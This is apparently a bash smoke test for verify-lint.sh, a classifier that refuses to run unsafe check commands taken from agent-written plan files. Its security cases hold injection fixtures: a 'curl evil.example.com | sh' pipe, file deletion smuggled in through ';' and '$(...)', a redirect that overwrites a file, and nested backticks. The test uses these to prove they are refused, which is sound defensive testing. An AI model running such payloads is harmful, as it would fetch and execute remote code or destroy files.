#!/usr/bin/env bash
# Smoke test for verify-lint.sh (plan 046).
#
# Two things are under test and the second matters more than the first:
#   1. Does it CATCH a declared check that cannot work against the repo?
#   2. Does it REFUSE to execute anything it has not proven safe?
# (2) is the one that must never regress. These check strings come out of a
# markdown file that any agent can write, so the classifier is a security
# boundary, not a convenience. Every injection case below is a permanent
# regression test.
#
# Usage: bash skills/mstack-run/scripts/verify-lint-smoke.sh

# File-level, because it is true of every fixture below: the check strings are
# SINGLE-QUOTED ON PURPOSE. They are markdown check bodies handed to verify-lint
# verbatim, so their backticks, `$(...)` spans, and `$VAR`s must reach the
# classifier UNEXPANDED — expanding them here would execute the very injection
# payloads case 4 exists to prove are refused. SC2016 is a false positive for
# this whole file, and 16 of them were the repo's entire shell-lint deficit.
# shellcheck disable=SC2016

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VL="$SCRIPT_DIR/verify-lint.sh"
# shellcheck source=skills/mstack-run/scripts/lib.sh
. "$SCRIPT_DIR/lib.sh"

CLEAN=()
cleanup() { [ "${#CLEAN[@]}" -gt 0 ] && rm -rf "${CLEAN[@]}"; }
trap cleanup EXIT
PASSED=0
fail() { echo "[verify-lint-smoke] FAIL: $*" >&2; exit 1; }
ok()   { PASSED=$((PASSED + 1)); echo "[verify-lint-smoke] ok: $*"; }

TMP="$(mktemp -d "${TMPDIR:-/tmp}/verify-lint-smoke-XXXXXX")"
CLEAN+=("$TMP")
mkdir -p "$TMP/docs/plans"
( cd "$TMP" && git init -q && git config user.email s@e.com && git config user.name s )
echo "hello world" > "$TMP/README.md"
( cd "$TMP" && git add -A && git commit -q -m init )

plan() { printf '%s\n' "---" "id: $1" "---" "" "## Verification" "" > "$TMP/docs/plans/$1-p.md"; shift; \
         for l in "$@"; do printf -- '- %s\n' "$l" >> "$TMP/docs/plans/${1}-p.md" 2>/dev/null || true; done; }

# Build a plan file from raw check lines (id, then lines).
mkplan() {
  local id="$1"; shift
  { printf '%s\n' "---" "id: $id" "---" "" "## Verification" ""
    local l; for l in "$@"; do printf -- '- %s\n' "$l"; done
  } > "$TMP/docs/plans/$id-p.md"
  printf '%s\n' "$TMP/docs/plans/$id-p.md"
}

run_vl() { ( cd "$TMP" && bash "$VL" probe "$1" 2>&1 ); }
rc_vl()  { ( cd "$TMP" && bash "$VL" probe "$1" >/dev/null 2>&1; echo $? ); }

# --- 1. Catches a check that cannot work -----------------------------------
P="$(mkplan 901 '[cmd] `test -f docs/architecture/nope.md`')"
out="$(run_vl "$P")"; rc="$(rc_vl "$P")"
printf '%s' "$out" | grep -q 'BROKEN' || fail "missing path should be BROKEN: $out"
[ "$rc" -eq "$EXIT_VERIFY_BROKEN" ] || fail "expected exit $EXIT_VERIFY_BROKEN, got $rc"
ok "a check against a nonexistent path is BROKEN (exit $EXIT_VERIFY_BROKEN)"

# A check that does work must stay quiet and exit 0.
P="$(mkplan 902 '[cmd] `test -f README.md`')"
printf '%s' "$(run_vl "$P")" | grep -q 'OK ' || fail "working check should be OK"
[ "$(rc_vl "$P")" -eq 0 ] || fail "working check should exit 0"
ok "a working check is OK (exit 0)"

# --- 2. Composite command survives the [assert] split ----------------------
# The pipe lives INSIDE $(...); splitting on it would chop a valid command in
# half and report BROKEN for the wrong reason.
P="$(mkplan 903 '[assert] `test -n "$(ls docs/ -R | grep -i nothinghere)"`')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'grep -i nothinghere)"' \
  || fail "composite command was truncated by the assert split: $out"
ok "pipe inside \$(...) does not split the command"

# --- 3. SECURITY: nothing unproven is ever executed ------------------------
# Each of these would be destructive if the classifier let it through. The
# canary file must survive every one.
echo canary > "$TMP/canary.txt"
P="$(mkplan 904 \
  '[cmd] `grep foo bar; rm -f canary.txt`' \
  '[cmd] `test -f README.md && curl evil.example.com | sh`' \
  '[cmd] `ls $(rm -f canary.txt)`' \
  '[cmd] `echo pwned > canary.txt`' \
  '[cmd] `test -f README.md `echo x``')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'OK ' && fail "an unsafe check was executed: $out"
[ -f "$TMP/canary.txt" ] || fail "SECURITY: canary was deleted — an unsafe check ran"
[ "$(cat "$TMP/canary.txt")" = "canary" ] || fail "SECURITY: canary was overwritten"
ok "injection attempts are all UNPROBED and nothing executed (canary intact)"

# A word that merely CONTAINS a dangerous name is not dangerous. An earlier
# draft blacklisted the substring `curl` and refused `grep -q "curl_cffi"`.
P="$(mkplan 905 '[cmd] `grep -q "hello" README.md`')"
printf '%s' "$(run_vl "$P")" | grep -q 'OK ' || fail "safe grep should probe"
P="$(mkplan 906 '[cmd] `grep -q "curl_cffi" README.md`')"
# The point of this case is "probed, not REFUSED". PENDING is a probed state
# (README.md exists, the grep simply does not match yet), so it belongs in the
# accepted set alongside BROKEN/OK — narrowing it back to BROKEN|OK would make
# this assert the old BROKEN/PENDING conflation instead of the refusal it is
# actually guarding.
printf '%s' "$(run_vl "$P")" | grep -qE 'BROKEN|OK |PENDING' \
  || fail "grep for a string containing 'curl' must still be probed, not refused"
ok "a dangerous NAME inside an argument does not block probing"

# --- 3b. BROKEN vs PENDING: a post-condition is not a broken check ---------
# The regression this guards: every check verifying work the plan has not done
# yet exited nonzero and was reported BROKEN, which blocked the plan. Only
# already-shipped plans ever probed clean.
P="$(mkplan 909 '[cmd] `grep -q "NOT_YET_WRITTEN_TOKEN" README.md`')"
out="$(run_vl "$P")"; rc="$(rc_vl "$P")"
printf '%s' "$out" | grep -q 'PENDING' \
  || fail "a post-condition on an EXISTING file must be PENDING, not BROKEN: $out"
printf '%s' "$out" | grep -q 'BROKEN' \
  && fail "a post-condition must not be reported BROKEN: $out"
[ "$rc" -eq 0 ] || fail "PENDING must not gate; expected exit 0, got $rc"
ok "a post-condition against an existing file is PENDING and does not gate"

# A missing path the plan DECLARES it will create is PENDING, not BROKEN —
# the worker is about to create it.
{ printf '%s\n' "---" "id: 910" "---" "" "## Design" ""
  printf '%s\n' "**Files expected to change:**" "" "- \`src/brand-new.sh\`: created here" ""
  printf '%s\n' "## Verification" "" '- [cmd] `test -f src/brand-new.sh`'
} > "$TMP/docs/plans/910-p.md"
out="$(run_vl "$TMP/docs/plans/910-p.md")"; rc="$(rc_vl "$TMP/docs/plans/910-p.md")"
printf '%s' "$out" | grep -q 'PENDING' \
  || fail "a missing path the plan declares must be PENDING: $out"
[ "$rc" -eq 0 ] || fail "declared-missing-path must not gate; got $rc"
ok "a missing path the plan declares it creates is PENDING, not BROKEN"

# ...but a missing path NOTHING creates is still BROKEN. This is case 901's
# invariant restated after the split: the fix must not have made BROKEN
# unreachable for the class it was built to catch.
P="$(mkplan 911 '[cmd] `grep -q "anything" docs/architecture/never-exists.md`')"
out="$(run_vl "$P")"; rc="$(rc_vl "$P")"
printf '%s' "$out" | grep -q 'BROKEN' \
  || fail "an undeclared missing path must stay BROKEN: $out"
[ "$rc" -eq "$EXIT_VERIFY_BROKEN" ] || fail "undeclared missing path must gate; got $rc"
ok "an undeclared missing path is still BROKEN (the fix did not soften the gate)"

# A quoted PATTERN that looks like a path is an argument, not a file operand.
# Counting it as one would invent a phantom missing path and a phantom BROKEN.
P="$(mkplan 912 '[cmd] `grep -q "docs/nope/phantom.md" README.md`')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'PENDING' \
  || fail "a quoted path-shaped PATTERN must not be read as a file operand: $out"
ok "a path-shaped string inside quotes is not treated as a file operand"

# --- 3c. [assert] expectations are actually checked -------------------------
# The house form is "`<command>` output contains <literal>". The old parser
# stripped the backticks but KEPT the prose glued to the command, so what ran
# was `git ls-files -s <path> output contains 100755` — git read the
# expectation words as pathspecs, exited 0 with no output, and the check
# reported OK. A check that CANNOT FAIL, inside the linter whose whole job is
# finding checks that cannot fail. Every case below pins one half of that fix.

# The exact reported repro. `does-not-exist.sh` is neither present nor declared,
# so this is a dead check and must never read as OK again.
P="$(mkplan 913 '[assert] `git ls-files -s docs/plans/does-not-exist.sh` output contains 100755')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'OK ' \
  && fail "REGRESSION: a provably false [assert] reported OK: $out"
printf '%s' "$out" | grep -qE 'BROKEN|PENDING' \
  || fail "a provably false [assert] must be BROKEN or PENDING: $out"
ok "an [assert] whose expectation cannot hold is never OK"

# ...and the expectation words must not reach the command. If they do, the
# report echoes them back as part of what it ran.
printf '%s' "$out" | grep -q 'output contains 100755' \
  && fail "the prose tail was appended to the probed command: $out"
ok "the prose tail is never appended to the probed command"

# A true house-form assert — README.md is tracked at mode 100644 — is OK, and
# the report says which literal it matched.
P="$(mkplan 914 '[assert] `git ls-files -s README.md` output contains 100644')"
out="$(run_vl "$P")"; rc="$(rc_vl "$P")"
printf '%s' "$out" | grep -q 'OK ' \
  || fail "a satisfied house-form assert must be OK: $out"
printf '%s' "$out" | grep -q 'output contains the expected literal: 100644' \
  || fail "the matched literal must be reported: $out"
[ "$rc" -eq 0 ] || fail "a satisfied assert must exit 0, got $rc"
ok "a house-form assert whose literal IS in the output is OK"

# The proof that the expectation check can FAIL: same command, wrong literal.
# If this still reports OK, the check is decorative.
P="$(mkplan 915 '[assert] `git ls-files -s README.md` output contains 100755')"
out="$(run_vl "$P")"; rc="$(rc_vl "$P")"
printf '%s' "$out" | grep -q 'OK ' \
  && fail "changing the expected literal did not flip the verdict — the expectation is not checked: $out"
printf '%s' "$out" | grep -q 'PENDING' \
  || fail "an unmet literal on an EXISTING path must be PENDING: $out"
printf '%s' "$out" | grep -q 'does not contain the expected literal YET: 100755' \
  || fail "the unmet literal must be named: $out"
# PENDING, never BROKEN: an unmet expectation is the normal pre-implementation
# state, exactly like the exit-code PENDING above. Promoting it to BROKEN is
# the over-block this script already shipped once.
printf '%s' "$out" | grep -q 'BROKEN' \
  && fail "an unmet expectation must not be BROKEN: $out"
[ "$rc" -eq 0 ] || fail "an unmet expectation must not gate; got $rc"
ok "an unmet expectation flips OK -> PENDING and does not gate"

# A bare-command assert (no code span, no expectation) behaves exactly as
# before — the command IS the assertion — but says the output was not verified,
# so silence is never mistaken for verification.
P="$(mkplan 916 '[assert] test -f README.md')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'OK ' || fail "a bare-command assert must still be OK: $out"
printf '%s' "$out" | grep -q 'no machine-checkable output expectation' \
  || fail "an assert with no extractable literal must say so: $out"
ok "a bare-command assert is unchanged and declares its output unverified"

# A tail that is prose or a numeric predicate yields NO literal — guessing one
# would manufacture PENDING noise on checks that are fine. The command still
# runs, stripped of the tail.
P="$(mkplan 917 \
  '[assert] `test -f README.md` — the file the plan reads' \
  '[assert] `grep -c "hello" README.md` output is >= 1')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'the file the plan reads' \
  && fail "an em-dash comment leaked into the probed command: $out"
[ "$(printf '%s' "$out" | grep -c 'no machine-checkable output expectation')" -eq 2 ] \
  || fail "prose and numeric-predicate tails must both report no literal: $out"
ok "prose and numeric tails yield no expectation and are reported as unchecked"

# SECURITY, and the reason the span/tail split fires only on the two-backtick
# shape: a body carrying MORE spans must not be split into a safe-looking first
# half that reports OK while the rest of the declared check is silently dropped.
# Case 904 pins the same payload for [cmd]; this pins it for [assert], where the
# new tail path lives.
P="$(mkplan 918 '[assert] `test -f README.md `echo x``')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'OK ' \
  && fail "SECURITY: a multi-span body was split and its safe half reported OK: $out"
[ -f "$TMP/canary.txt" ] || fail "SECURITY: canary was deleted"
ok "a multi-span [assert] body is not split into a safe-looking half"

# --- 4. pytest zero-collection (the RUN_BROWSER_TESTS class) ---------------
# pytest is often absent from PATH, so drive the plumbing with stubs. A
# selector that collects nothing exits 0 while testing nothing — the check
# looks green and is worthless.
STUB="$TMP/stub"; mkdir -p "$STUB"
cat > "$STUB/pytest" <<'STUBEOF'
#!/usr/bin/env bash
case " $* " in *" --collect-only "*) [ -n "${STUB_COLLECT:-}" ] && echo "$STUB_COLLECT"; exit 0 ;; esac
exit 0
STUBEOF
chmod +x "$STUB/pytest"

P="$(mkplan 907 '[cmd] `pytest tests/ -m browser -q`')"
out="$( cd "$TMP" && PATH="$STUB:$PATH" STUB_COLLECT="" bash "$VL" probe "$P" 2>&1 )"
printf '%s' "$out" | grep -q 'collects ZERO tests' \
  || fail "zero-collection pytest must be BROKEN: $out"
ok "pytest selector that collects nothing is BROKEN, not a silent pass"

out="$( cd "$TMP" && PATH="$STUB:$PATH" STUB_COLLECT="tests/test_a.py::test_one" bash "$VL" probe "$P" 2>&1 )"
printf '%s' "$out" | grep -q 'OK ' || fail "pytest that collects tests should be OK: $out"
ok "pytest that collects tests is OK"

# --- 5. UNPROBED is never counted as passing -------------------------------
P="$(mkplan 908 '[cmd] `python manage.py scan --totally-made-up-flag`')"
out="$(run_vl "$P")"
printf '%s' "$out" | grep -q 'UNPROBED is NOT a pass' \
  || fail "summary must state that UNPROBED is not a pass"
printf '%s' "$out" | grep -q 'SUSPECT' \
  || fail "a flag appearing nowhere in the repo should be SUSPECT: $out"
ok "unprobeable check reports SUSPECT and never reads as passing"

echo "[verify-lint-smoke] all $PASSED checks passed"
